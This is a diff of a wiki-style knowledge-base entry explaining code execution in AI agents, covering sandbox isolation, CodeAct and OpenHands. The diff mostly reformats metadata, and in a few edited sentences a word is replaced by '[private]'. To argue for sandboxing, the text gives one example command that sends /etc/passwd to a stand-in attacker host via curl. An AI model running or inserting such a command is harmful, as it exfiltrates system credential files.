@@ -1,8 +1,3 @@
----
-public: true
----
-
-# Code Execution
 ```json-ld
 {
   "@context": "https://narrativegoldmine.com/context/v1.jsonld",
@@ -12,37 +7,130 @@ public: true
   "title": "Code Execution",
   "vc:public": true,
   "vc:outboundWikilinks": [
-    {"@id": "urn:visionflow:linked:ai-agent-systems", "vc:label": "AI Agent Systems"},
-    {"@id": "urn:visionflow:linked:cli-multi-agent-systems", "vc:label": "CLI Multi-Agent Systems"},
-    {"@id": "urn:visionflow:linked:agentic-workflow", "vc:label": "Agentic Workflow"},
-    {"@id": "urn:visionflow:linked:large-language-models", "vc:label": "Large Language Models"},
-    {"@id": "urn:visionflow:linked:code-generation", "vc:label": "Code Generation"},
-    {"@id": "urn:visionflow:linked:tool-use", "vc:label": "Tool Use"},
-    {"@id": "urn:visionflow:linked:sandboxed-code-execution", "vc:label": "Sandboxed Code Execution"},
-    {"@id": "urn:visionflow:linked:firecracker", "vc:label": "Firecracker"},
-    {"@id": "urn:visionflow:linked:docker", "vc:label": "Docker"},
-    {"@id": "urn:visionflow:linked:gvisor", "vc:label": "gVisor"},
-    {"@id": "urn:visionflow:linked:python", "vc:label": "Python"},
-    {"@id": "urn:visionflow:linked:bash", "vc:label": "Bash"},
-    {"@id": "urn:visionflow:linked:codeact", "vc:label": "CodeAct"},
-    {"@id": "urn:visionflow:linked:react", "vc:label": "ReAct"},
-    {"@id": "urn:visionflow:linked:openhands", "vc:label": "OpenHands"},
-    {"@id": "urn:visionflow:linked:model-context-protocol", "vc:label": "Model Context Protocol"},
-    {"@id": "urn:visionflow:linked:e2b", "vc:label": "E2B"},
-    {"@id": "urn:visionflow:linked:modal", "vc:label": "Modal"},
-    {"@id": "urn:visionflow:linked:reinforcement-learning", "vc:label": "Reinforcement Learning"},
-    {"@id": "urn:visionflow:linked:function-calling", "vc:label": "Function Calling"},
-    {"@id": "urn:visionflow:linked:prompt-engineering", "vc:label": "Prompt Engineering"},
-    {"@id": "urn:visionflow:linked:llm-agents", "vc:label": "LLM Agents"},
-    {"@id": "urn:visionflow:linked:git", "vc:label": "Git"},
-    {"@id": "urn:visionflow:linked:opentelemetry", "vc:label": "OpenTelemetry"},
-    {"@id": "urn:visionflow:linked:swe-agent", "vc:label": "SWE-agent"},
-    {"@id": "urn:visionflow:linked:autogen", "vc:label": "AutoGen"},
-    {"@id": "urn:visionflow:linked:langgraph", "vc:label": "LangGraph"},
-    {"@id": "urn:visionflow:linked:infrastructure-as-code", "vc:label": "Infrastructure as Code"},
-    {"@id": "urn:visionflow:linked:state-management", "vc:label": "State Management"},
-    {"@id": "urn:visionflow:linked:static-analysis", "vc:label": "Static Analysis"},
-    {"@id": "urn:visionflow:linked:formal-verification", "vc:label": "Formal Verification"}
+    {
+      "@id": "urn:visionflow:linked:ai-agent-systems",
+      "vc:label": "AI Agent Systems"
+    },
+    {
+      "@id": "urn:visionflow:linked:cli-multi-agent-systems",
+      "vc:label": "CLI Multi-Agent Systems"
+    },
+    {
+      "@id": "urn:visionflow:linked:agentic-workflow",
+      "vc:label": "Agentic Workflow"
+    },
+    {
+      "@id": "urn:visionflow:linked:large-language-models",
+      "vc:label": "Large Language Models"
+    },
+    {
+      "@id": "urn:visionflow:linked:code-generation",
+      "vc:label": "Code Generation"
+    },
+    {
+      "@id": "urn:visionflow:linked:tool-use",
+      "vc:label": "Tool Use"
+    },
+    {
+      "@id": "urn:visionflow:linked:sandboxed-code-execution",
+      "vc:label": "Sandboxed Code Execution"
+    },
+    {
+      "@id": "urn:visionflow:linked:firecracker",
+      "vc:label": "Firecracker"
+    },
+    {
+      "@id": "urn:visionflow:linked:docker",
+      "vc:label": "Docker"
+    },
+    {
+      "@id": "urn:visionflow:linked:gvisor",
+      "vc:label": "gVisor"
+    },
+    {
+      "@id": "urn:visionflow:linked:python",
+      "vc:label": "Python"
+    },
+    {
+      "@id": "urn:visionflow:linked:bash",
+      "vc:label": "Bash"
+    },
+    {
+      "@id": "urn:visionflow:linked:codeact",
+      "vc:label": "CodeAct"
+    },
+    {
+      "@id": "urn:visionflow:linked:react",
+      "vc:label": "ReAct"
+    },
+    {
+      "@id": "urn:visionflow:linked:openhands",
+      "vc:label": "OpenHands"
+    },
+    {
+      "@id": "urn:visionflow:linked:model-context-protocol",
+      "vc:label": "Model Context Protocol"
+    },
+    {
+      "@id": "urn:visionflow:linked:e2b",
+      "vc:label": "E2B"
+    },
+    {
+      "@id": "urn:visionflow:linked:modal",
+      "vc:label": "Modal"
+    },
+    {
+      "@id": "urn:visionflow:linked:reinforcement-learning",
+      "vc:label": "Reinforcement Learning"
+    },
+    {
+      "@id": "urn:visionflow:linked:function-calling",
+      "vc:label": "Function Calling"
+    },
+    {
+      "@id": "urn:visionflow:linked:prompt-engineering",
+      "vc:label": "Prompt Engineering"
+    },
+    {
+      "@id": "urn:visionflow:linked:llm-agents",
+      "vc:label": "LLM Agents"
+    },
+    {
+      "@id": "urn:visionflow:linked:git",
+      "vc:label": "Git"
+    },
+    {
+      "@id": "urn:visionflow:linked:opentelemetry",
+      "vc:label": "OpenTelemetry"
+    },
+    {
+      "@id": "urn:visionflow:linked:swe-agent",
+      "vc:label": "SWE-agent"
+    },
+    {
+      "@id": "urn:visionflow:linked:autogen",
+      "vc:label": "AutoGen"
+    },
+    {
+      "@id": "urn:visionflow:linked:langgraph",
+      "vc:label": "LangGraph"
+    },
+    {
+      "@id": "urn:visionflow:linked:infrastructure-as-code",
+      "vc:label": "Infrastructure as Code"
+    },
+    {
+      "@id": "urn:visionflow:linked:state-management",
+      "vc:label": "State Management"
+    },
+    {
+      "@id": "urn:visionflow:linked:static-analysis",
+      "vc:label": "Static Analysis"
+    },
+    {
+      "@id": "urn:visionflow:linked:formal-verification",
+      "vc:label": "Formal Verification"
+    }
   ],
   "vc:schemaVersion": 2
 }
@@ -57,18 +145,26 @@ public: true
   "definition": "Code execution, in the context of AI agents, is the capability whereby a model generates source code and runs it in a sandboxed interpreter or runtime, then incorporates the results into its reasoning. It transforms a language model from a text generator into a tool-using agent that can compute, manipulate data, call APIs, and verify outputs programmatically. It matters because executable tool use grounds agent behaviour in deterministic computation and extends capabilities beyond what next-token prediction alone can achieve.",
   "domain": "ai",
   "maturity": "established",
-  "subClassOf": [{"@id": "urn:ngm:class:ai-agent-system", "label": "AI Agent System"}],
+  "subClassOf": [
+    {
+      "@id": "urn:ngm:class:ai-agent-system",
+      "label": "AI Agent System"
+    }
+  ],
   "relations": {
     "relatedTo": [
-      {"@id": "urn:ngm:class:cli-multi-agent-systems", "label": "CLI Multi-Agent Systems"}
+      {
+        "@id": "urn:ngm:class:cli-multi-agent-systems",
+        "label": "CLI Multi-Agent Systems"
+      }
     ]
   },
-  "quality": 0.90
+  "quality": 0.9
 }
 ```
 
 - ### Definition
-  - Code Execution, in the context of [[AI Agent Systems]], [[CLI Multi-Agent Systems]], and [[Agentic Workflow]], is the capability whereby a [[Large Language Models]] generates or selects source code and submits it to an isolated runtime environment, then incorporates the resulting output — including stdout, stderr, return values, raised exceptions, file-system side-effects, and structured data — back into its reasoning context as grounded, deterministic evidence for the next generation step. This closed observe-act feedback loop transforms a language model from a purely generative text system into a tool-using computational agent capable of performing numerical data analysis, invoking external [[API Integration]] endpoints, manipulating the filesystem, executing [[Bash]] shell commands, running unit tests to verify correctness, validating statistical hypotheses, constructing multi-step data pipelines, and self-correcting program logic without human mediation — grounding outputs in computationally verified facts rather than probabilistic language-model recall. The concept emerged from early work on [[Tool Use]] in [[Reinforcement Learning]] agents (where agents were given access to calculators, search engines, or Python interpreters as callable tools) and became the central capability of the modern agentic software engineering paradigm once frontier [[Large Language Models]] demonstrated sufficient [[Prompt Engineering]] responsiveness, instruction-following reliability, and context-integration capacity to write, run, observe, and revise code autonomously across multi-step tasks. Code execution is architecturally distinct from [[Code Generation]] in that generation produces text artefacts while execution instantiates those artefacts in a live computational process; the two are tightly coupled in practice — most production agents alternate between generation and execution in tight [[ReAct]]-style reasoning-plus-action cycles, where each execution result is a new observation that conditions the next generation step. Isolation and containment are the defining engineering concerns of production code execution systems: arbitrary code submitted by an [[LLM Agents]] to an unrestricted operating system runtime would constitute a severe security vulnerability, enabling data exfiltration, resource exhaustion, network lateral movement, and persistent backdoor installation; accordingly, production implementations universally employ one or more of three dominant isolation strategies — [[Firecracker]] microVM hardware virtualisation (providing kernel-level isolation through Linux KVM hypervisors with approximately 125ms cold-start latency and near-zero attack surface, as used by [[E2B]] and AWS Lambda), [[Docker]] containerisation with seccomp and AppArmor profiles for process-level namespace isolation, and [[gVisor]] user-space kernel interposition (Google, intercepting every syscall from the containerised process and re-implementing it in a safe Go-language runtime, adopted by Google Agent Sandbox on GKE and [[Modal]]), or restricted [[Python]] REPL interpreters that prohibit network and filesystem access entirely for lower-threat data-processing contexts. Resource governance — CPU quotas, memory limits, execution timeouts, network egress allow-lists, process-tree containment — enforces the economic and security boundaries required for multi-tenant cloud deployment and prevents runaway or adversarial code from consuming host resources or escaping the sandbox. The paradigm was crystallised by the [[CodeAct]] action-space formalism (Wang et al., 2024, ICLR 2025), which established executable [[Python]] as the universal primary interface between an [[LLM Agents]] and its environment in preference to fixed JSON [[Function Calling]] vocabularies — on the grounds that Python is Turing-complete, composable, self-documenting, and provides library abstractions for every conceivable tool invocation, collapsing multi-turn function-call dialogues into single code blocks with full control flow. [[OpenHands]] (formerly OpenDevin, All Hands AI, ICLR 2025) validated this empirically: building upon CodeAct's action space with secure [[Docker]] sandboxes, it demonstrated that a generalised software agent using only code execution and web browsing could resolve over 53% of real-world GitHub issues on SWE-bench Verified with standard models and exceeding 72% with Claude Sonnet 4.5 extended thinking, establishing sandboxed code execution as the primary substrate through which autonomous agents manipulate and verify software systems. By 2026 the ecosystem had matured into a class of commercial managed-execution products — [[E2B]] (Firecracker-backed, AI-first SDK, 24-hour session limit), [[Modal]] (gVisor, GPU support, serverless scale), Vercel Sandbox (edge-deployed, sub-100ms cold start), Daytona (developer-environment-focused, GPU cloud), and Spheron Network (NVIDIA GPU sandboxes for ML workloads) — providing sandboxed execution APIs with sub-200ms cold starts, persistent-session semantics, and first-class [[Large Language Models]] SDK integrations, positioning code execution as an infrastructure-layer commodity analogous to cloud object storage or managed database access within the agentic AI stack. The practice is central to [[Agentic Workflow]], standardised across framework ecosystems by [[Model Context Protocol]] tool schemas, and measured at benchmark level by SWE-bench Verified, [[OSWorld]], and AgentBench — evaluation suites that capture agent capability to resolve real-world software engineering, computer-use, and general-purpose task scenarios through code execution loops rather than single-turn generation.
+  - Code Execution, in the context of [[AI Agent Systems]], [[CLI Multi-Agent Systems]], and [[Agentic Workflow]], is the capability whereby a [[Large Language Models]] generates or selects source code and submits it to an isolated runtime environment, then incorporates the resulting output — including stdout, stderr, return values, raised exceptions, file-system side-effects, and structured data — back into its reasoning context as grounded, deterministic evidence for the next generation step. This closed observe-act feedback loop transforms a language model from a purely generative text system into a tool-using computational agent capable of performing numerical data analysis, invoking external [[API Integration]] endpoints, manipulating the filesystem, executing [[Bash]] shell commands, running unit tests to verify correctness, validating statistical hypotheses, constructing multi-step data pipelines, and self-correcting program logic without human mediation — grounding outputs in computationally verified facts rather than probabilistic language-model recall. The concept emerged from early work on [[Tool Use]] in [[Reinforcement Learning]] agents (where agents were given access to calculators, search engines, or Python interpreters as callable tools) and became the central capability of the modern agentic software engineering paradigm once frontier [[Large Language Models]] demonstrated sufficient [[Prompt Engineering]] responsiveness, instruction-following reliability, and context-integration capacity to write, run, observe, and revise code autonomously across multi-step tasks. Code execution is architecturally distinct from [[Code Generation]] in that generation produces text artefacts while execution instantiates those artefacts in a live computational process; the two are tightly coupled in practice — most production agents alternate between generation and execution in tight [[ReAct]]-style reasoning-plus-action cycles, where each execution result is a new observation that conditions the next generation step. Isolation and containment are the defining engineering concerns of production code execution systems: arbitrary code submitted by an [[LLM Agents]] to an unrestricted operating system runtime would constitute a severe security vulnerability, enabling data exfiltration, resource exhaustion, network lateral movement, and persistent backdoor installation; accordingly, production implementations universally employ one or more of three dominant isolation strategies — [[Firecracker]] microVM hardware virtualisation (providing kernel-level isolation through Linux KVM hypervisors with approximately 125ms cold-start latency and near-zero attack surface, as used by [[E2B]] and AWS Lambda), [[Docker]] containerisation with seccomp and AppArmor profiles for process-level namespace isolation, and [[gVisor]] user-space kernel interposition (Google, intercepting every syscall from the containerised process and re-implementing it in a safe Go-language runtime, adopted by Google Agent Sandbox on GKE and [[Modal]]), or restricted [[Python]] REPL interpreters that prohibit network and filesystem access entirely for lower-threat data-processing contexts. Resource governance — CPU quotas, memory limits, execution timeouts, network egress allow-lists, process-tree containment — enforces the economic and security boundaries required for multi-tenant cloud deployment and prevents runaway or adversarial code from consuming host resources or escaping the sandbox. The paradigm was crystallised by the [[CodeAct]] action-space formalism (Wang et al., 2024, ICLR 2025), which established executable [[Python]] as the universal primary interface between an [[LLM Agents]] and its environment in preference to fixed JSON [[Function Calling]] vocabularies — on the grounds that Python is Turing-complete, composable, self-documenting, and provides library abstractions for every conceivable tool invocation, collapsing multi-turn function-call dialogues into single code blocks with full control flow. [[OpenHands]] (formerly OpenDevin, All Hands AI, ICLR 2025) validated this empirically: building upon CodeAct's action space with secure [[Docker]] sandboxes, it demonstrated that a generalised software agent using only code execution and web browsing [private] resolve over 53% of real-world GitHub issues on SWE-bench Verified with standard models and exceeding 72% with Claude Sonnet 4.5 extended thinking, establishing sandboxed code execution as the primary substrate through which autonomous agents manipulate and verify software systems. By 2026 the ecosystem had matured into a class of commercial managed-execution products — [[E2B]] (Firecracker-backed, AI-first SDK, 24-hour session limit), [[Modal]] (gVisor, GPU support, serverless scale), Vercel Sandbox (edge-deployed, sub-100ms cold start), Daytona (developer-environment-focused, GPU cloud), and Spheron Network (NVIDIA GPU sandboxes for ML workloads) — providing sandboxed execution APIs with sub-200ms cold starts, persistent-session semantics, and first-class [[Large Language Models]] SDK integrations, positioning code execution as an infrastructure-layer commodity analogous to cloud object storage or managed database access within the agentic AI stack. The practice is central to [[Agentic Workflow]], standardised across framework ecosystems by [[Model Context Protocol]] tool schemas, and measured at benchmark level by SWE-bench Verified, [[OSWorld]], and AgentBench — evaluation suites that capture agent capability to resolve real-world software engineering, computer-use, and general-purpose task scenarios through code execution loops rather than single-turn generation.
 
 - ### Semantic Classification
   - owl-class:: ai:CodeExecution
@@ -175,7 +271,7 @@ public: true
 
   ## About
 
-  Code Execution as an AI agent capability has its conceptual roots in the classical computer science notion of a REPL (Read-Eval-Print Loop), popularised by Lisp environments in the 1960s and formalised by John McCarthy's interactive Lisp interpreter at MIT. The REPL paradigm — read an expression, evaluate it in the current environment, print the result, loop — prefigures the agent observe-act cycle exactly: the agent reads a task or observation, generates an executable expression (code), evaluates it in the sandbox, and observes the printed output to inform the next step. The modern AI-agent form of this pattern emerged from two converging research streams: tool-use in [[Reinforcement Learning]] (where agents were given access to calculators, lookup tables, or search engines as callable tools, from DQN's atari game score accumulation through WebGPT's browser interface) and neural [[Code Generation]] (which raised the question of what to do with generated code beyond inspecting it as text output). The watershed public moment came in 2022-2023 when OpenAI's code-interpreter plugin for ChatGPT demonstrated to millions of practitioners that an [[LLM Agents]] could write [[Python]] to solve a user's data analysis or visualisation problem and actually run it, returning a matplotlib figure or a computed numerical result rather than merely prose describing how one might hypothetically compute such a result. This demonstration collapsed the conceptual barrier between generation and execution in mainstream AI tooling, triggering a rapid shift in framework design from function-call vocabularies toward code-as-action.
+  Code Execution as an AI agent capability has its conceptual roots in the classical computer science notion of a REPL (Read-Eval-Print Loop), popularised by Lisp environments in the 1960s and formalised by John McCarthy's interactive Lisp interpreter at MIT. The REPL paradigm — read an expression, evaluate it in the current environment, print the result, loop — prefigures the agent observe-act cycle exactly: the agent reads a task or observation, generates an executable expression (code), evaluates it in the sandbox, and observes the printed output to inform the next step. The modern AI-agent form of this pattern emerged from two converging research streams: tool-use in [[Reinforcement Learning]] (where agents were given access to calculators, lookup tables, or search engines as callable tools, from DQN's atari game score accumulation through WebGPT's browser interface) and neural [[Code Generation]] (which raised the question of what to do with generated code beyond inspecting it as text output). The watershed public moment came in 2022-2023 when OpenAI's code-interpreter plugin for ChatGPT demonstrated to millions of practitioners that an [[LLM Agents]] [private] write [[Python]] to solve a user's data analysis or visualisation problem and actually run it, returning a matplotlib figure or a computed numerical result rather than merely prose describing how one might hypothetically compute such a result. This demonstration collapsed the conceptual barrier between generation and execution in mainstream AI tooling, triggering a rapid shift in framework design from function-call vocabularies toward code-as-action.
 
   The defining theoretical contribution came from the [[CodeAct]] paper (Wang et al., 2024, accepted at ICLR 2025), which rigorously formalised the choice of [[Python]] code as the universal action space for agentic AI systems and provided empirical evidence of its superiority over structured JSON [[Function Calling]] schemas on 17 diverse agent benchmarks. The argument rests on four properties of Python as an action space: Turing-completeness (any computation expressible as JSON function-call chains is expressible as Python, but not vice versa); composability (Python functions, objects, and control flow enable multi-step behaviours within a single action step); self-documentation (Python variable names and docstrings provide interpretable traces for debugging and oversight); and library coverage (Python's package ecosystem covers every domain a code-executing agent might encounter, from scientific computing via numpy/scipy to web scraping via requests/beautifulsoup to machine learning via torch/transformers). The theoretical consequence is that CodeAct's action space subsumes all prior fixed-vocabulary tool-use frameworks while strictly extending them. [[OpenHands]], the open-source software agent framework built on CodeAct's action space by All Hands AI (Princeton Language and Intelligence Lab spin-out, $18.8M Series A), validated this claim at production benchmark scale: achieving SWE-bench Verified scores of 53%+ with standard models and exceeding 72% with Claude Sonnet 4.5 extended thinking, [[OpenHands]] established sandboxed code execution as the primary substrate through which autonomous agents interact with, modify, and verify software systems at repository scale.
 
@@ -195,7 +291,7 @@ public: true
 
   The information-theoretic perspective on code execution complements the operational semantics view. From an information theory standpoint, the generation step is a lossy compression of the agent's intended computation: the code produced is a finite string that must implicitly represent the agent's computational intent within the syntax and semantics of the target programming language. The execution step is an information expansion: the interpreter or runtime unpacks the compressed string representation into a full computational process that may produce megabytes of output, modify gigabytes of filesystem state, and consume billions of CPU cycles — far exceeding the entropy of the submitted code string itself. This asymmetry between code length and execution effect is what makes sandboxing essential: a short code string representing `import subprocess; subprocess.run(["curl", "-X", "POST", "attacker.com/exfil", "--data", "@/etc/passwd"])` has small syntactic entropy but potentially catastrophic semantic consequence if the execution environment is unrestricted.
 
-  Formal containment proofs for sandboxed execution environments rely on the confinement property: for any code string c and environment state s_E, exec(c, s_E) ∈ S_safe. This property is straightforwardly falsifiable for any concrete sandbox implementation via vulnerability analysis and penetration testing — the approach taken by SandboxEscapeBench. Constructive proofs of confinement for specific implementations are harder: [[Firecracker]]'s confinement guarantee relies on the correctness of Linux KVM (hardware hypervisor), the correctness of the Firecracker VMM codebase (approximately 50,000 lines of Rust with strong memory-safety guarantees from the type system), and the correctness of the host Linux kernel's KVM interface — any of which could, in principle, contain exploitable bugs. [[gVisor]]'s confinement guarantee relies on the correctness of its Go-language user-space kernel implementation (approximately 150,000 lines) and the absence of exploitable kernel bugs in the (reduced, controlled) set of host syscalls that gVisor itself makes. Both isolation primitives reduce the trusted computing base (TCB) compared to unrestricted execution, but neither provides a mechanised proof of confinement, making empirical evaluation benchmarks like SandboxEscapeBench a necessary complement to design-time isolation reasoning.
+  Formal containment proofs for sandboxed execution environments rely on the confinement property: for any code string c and environment state s_E, exec(c, s_E) ∈ S_safe. This property is straightforwardly falsifiable for any concrete sandbox implementation via vulnerability analysis and penetration testing — the approach taken by SandboxEscapeBench. Constructive proofs of confinement for specific implementations are harder: [[Firecracker]]'s confinement guarantee relies on the correctness of Linux KVM (hardware hypervisor), the correctness of the Firecracker VMM codebase (approximately 50,000 lines of Rust with strong memory-safety guarantees from the type system), and the correctness of the host Linux kernel's KVM interface — any of which [private], in principle, contain exploitable bugs. [[gVisor]]'s confinement guarantee relies on the correctness of its Go-language user-space kernel implementation (approximately 150,000 lines) and the absence of exploitable kernel bugs in the (reduced, controlled) set of host syscalls that gVisor itself makes. Both isolation primitives reduce the trusted computing base (TCB) compared to unrestricted execution, but neither provides a mechanised proof of confinement, making empirical evaluation benchmarks like SandboxEscapeBench a necessary complement to design-time isolation reasoning.
 
   The complexity class perspective illuminates the worst-case limitations of code execution containment. The halting problem — whether a given program will terminate — is undecidable in general (Turing, 1936), which immediately implies that no sandbox can completely prevent infinite loops without time limits. The execution timeout mechanism (enforcing a maximum wall-clock duration T_max) converts the infinite execution problem into a bounded one: any program that does not terminate within T_max is forcibly killed, and the resulting TimeoutError observation is returned to the agent. This converts an undecidable termination check into a decidable resource-bounded execution, at the cost of potentially terminating legitimately long-running computations before they complete. The design of T_max values is therefore a principled engineering trade-off between computational expressiveness (higher T_max allows longer computations) and resource consumption and liveness (lower T_max ensures timely agent step completion and predictable cost). Production systems typically implement tiered timeout policies: 30 seconds for interactive debugging steps, 5 minutes for test suite execution, and up to 1 hour for explicitly flagged long-running scientific computations.
 
@@ -237,11 +333,11 @@ public: true
 
   ## Academic Context
 
-  Code execution as an AI agent capability sits at the intersection of four research traditions: operational semantics and formal methods (providing the theoretical grounding for what execution means), the tool-use literature in [[Reinforcement Learning]] (providing the first empirical evidence that external computation could augment neural model capabilities), the [[Code Generation]] community (which produced the code-writing models that make agent code execution possible), and the multi-agent systems research tradition (which developed the orchestration and planning layers that coordinate sequences of execution steps).
+  Code execution as an AI agent capability sits at the intersection of four research traditions: operational semantics and formal methods (providing the theoretical grounding for what execution means), the tool-use literature in [[Reinforcement Learning]] (providing the first empirical evidence that external computation [private] augment neural model capabilities), the [[Code Generation]] community (which produced the code-writing models that make agent code execution possible), and the multi-agent systems research tradition (which developed the orchestration and planning layers that coordinate sequences of execution steps).
 
   The foundational theoretical work comes from operational semantics: Plotkin's Structural Operational Semantics (1981) provided a mathematical framework for defining the meaning of program execution as a sequence of state transitions, independent of any particular implementation. Wright and Felleisen's syntactic approach to type soundness (1994) established how execution semantics relates to the type system of a language, grounding safety proofs for programming language execution. These theoretical foundations underpin the security reasoning applied to agent sandbox design — the question of whether code execution can escape a sandbox is, at a theoretical level, a question about the operational semantics of the execution environment and whether its transition rules can produce states outside the intended confinement boundary.
 
-  The tool-use research trajectory began in [[Reinforcement Learning]] with agents given discrete, bounded tool actions (calculator invocation, database lookup, search engine query) as atomic extensions to their policy action space. Nakano et al.'s WebGPT (2021) demonstrated that an LLM could be trained via [[Reinforcement Learning from Human Feedback]] to use a web browser as a tool, substantially outperforming base-model performance on fact-intensive question answering. Gao et al.'s PAL (Program-Aided Language Models, 2022) and Chen et al.'s Program-of-Thoughts (2022) showed that interleaving [[Python]] code generation with natural language reasoning dramatically improved mathematical and algorithmic problem-solving by offloading computation to an executed interpreter. The decisive synthesis was Yao et al.'s [[ReAct]] (2022), which established a general interleaved Reasoning-Acting framework where agents alternate between generating natural language reasoning traces (think) and taking executable tool actions (act), observing the outputs and incorporating them into subsequent reasoning steps — the precise pattern that defines modern code-executing agents.
+  The tool-use research trajectory began in [[Reinforcement Learning]] with agents given discrete, bounded tool actions (calculator invocation, database lookup, search engine query) as atomic extensions to their policy action space. Nakano et al.'s WebGPT (2021) demonstrated that an LLM [private] be trained via [[Reinforcement Learning from Human Feedback]] to use a web browser as a tool, substantially outperforming base-model performance on fact-intensive question answering. Gao et al.'s PAL (Program-Aided Language Models, 2022) and Chen et al.'s Program-of-Thoughts (2022) showed that interleaving [[Python]] code generation with natural language reasoning dramatically improved mathematical and algorithmic problem-solving by offloading computation to an executed interpreter. The decisive synthesis was Yao et al.'s [[ReAct]] (2022), which established a general interleaved Reasoning-Acting framework where agents alternate between generating natural language reasoning traces (think) and taking executable tool actions (act), observing the outputs and incorporating them into subsequent reasoning steps — the precise pattern that defines modern code-executing agents.
 
   The [[CodeAct]] paper (Wang et al., 2024) provided the decisive theoretical and empirical argument for Python code as the universal tool-action interface, superseding prior frameworks' fixed JSON function-call schemas by demonstrating Python's strictly greater expressiveness and practical superiority on 17 diverse agent evaluation tasks. OpenHands (Wang et al., ICLR 2025) provided the definitive open-source platform for software engineering agent research built on CodeAct principles, enabling reproducible comparison of different LLMs, prompting strategies, and sandbox configurations on SWE-bench. The SWE-agent paper (Yang et al., NeurIPS 2024) introduced the Agent-Computer Interface (ACI) concept — a principled design framework for the command interface through which an agent interacts with the execution environment, showing that interface design choices (command set, output format, error message design) substantially impact agent performance independent of the underlying LLM.
 
